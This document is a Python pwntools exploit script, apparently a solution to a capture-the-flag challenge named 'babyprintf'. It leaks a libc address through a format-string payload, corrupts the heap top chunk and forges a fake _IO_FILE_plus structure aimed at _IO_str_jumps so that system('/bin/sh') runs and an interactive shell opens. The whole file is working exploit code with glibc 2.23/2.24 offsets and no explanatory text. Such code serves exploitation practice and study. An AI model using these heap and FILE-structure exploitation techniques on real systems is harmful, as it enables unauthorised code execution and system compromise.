from pwn import *

#context.log_level = 'debug'
io_finish = 1
glibc_is_2_23 = 1
if glibc_is_2_23:
	io = process("./babyprintf")
	elf = ELF("./babyprintf")
	libc = elf.libc
else:
	io = process("./pwn")
	elf = ELF("./pwn")
	libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

def send(size, string):
	io.sendlineafter(b'size: ', str(size).encode())
	io.sendlineafter(b'string: ', string)


payload = b'%1$p-%2$p-%3$p-%4$p-%5$pXX%6$pYY'
print(len(payload))
send(len(payload), payload)
io.recvuntil(b'XX')

if glibc_is_2_23:
	# glibc_2.23
	libc_base = int(io.recvuntil(b'YY', drop = True), 16) - 240 - libc.symbols['__libc_start_main']
	_IO_str_jumps = libc_base + 0x3c37a0
else:
	# glibc_2.24
	libc_base = int(io.recvuntil(b'YY', drop = True), 16) - 241 - libc.symbols['__libc_start_main'] 
	_IO_str_jumps = libc_base + 0x3be4c0

print("libc_base:", hex(libc_base)) 
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))
_IO_list_all = libc_base + libc.symbols['_IO_list_all']
print("binsh:", hex(binsh), binsh)
#debug()

payload = b'A'*0x10 + p64(0) + p64(0xfb1)
send(0x10, payload)
#debug()

send(0x1000, b'xiaozaya')
#debug()

payload = b'\x00'*0x200
# io_finish
if io_finish:
	fake_io_file_plus  = p64(0) # fp->_flags = 0
	fake_io_file_plus += p64(0x61) # size
	fake_io_file_plus += p64(0)
	fake_io_file_plus += p64(_IO_list_all-0x10) # bk
	fake_io_file_plus += p64(0) # _IO_write_base = 0
	fake_io_file_plus += p64(1) # _IO_write_ptr = 1
	fake_io_file_plus += p64(0)
	fake_io_file_plus += p64(binsh) # _IO_buf_base = binsh
	fake_io_file_plus  = fake_io_file_plus.ljust(0xC0, b'\x00')
	fake_io_file_plus += p64(0) # fp->_mode = 0
	fake_io_file_plus  = fake_io_file_plus.ljust(0xD8, b'\x00')
	fake_io_file_plus += p64(_IO_str_jumps-8)
	fake_io_file_plus  = fake_io_file_plus.ljust(0xE8, b'\x00')
	fake_io_file_plus += p64(system)
else:
# io_pverflow
	fake_io_file_plus  = p64(0) # fp->_flags = 0
	fake_io_file_plus += p64(0x61) # size
	fake_io_file_plus += p64(0)
	fake_io_file_plus += p64(_IO_list_all-0x10) # bk
	fake_io_file_plus += p64(0) # _IO_write_base = 0
	fake_io_file_plus += p64((binsh-100)//2+1) # _IO_write_ptr = (binsh-100)/2+1	
	fake_io_file_plus += p64(0)
	fake_io_file_plus += p64(0) # _IO_buf_base = 0
	fake_io_file_plus += p64((binsh-100)//2) # _IO_base_end = (binsh-100)/2
	fake_io_file_plus  = fake_io_file_plus.ljust(0xD8, b'\x00')
	fake_io_file_plus += p64(_IO_str_jumps)
	fake_io_file_plus += p64(system)

payload += fake_io_file_plus
send(0x200, payload)
io.sendlineafter(b'size: ', b'1')
io.interactive()
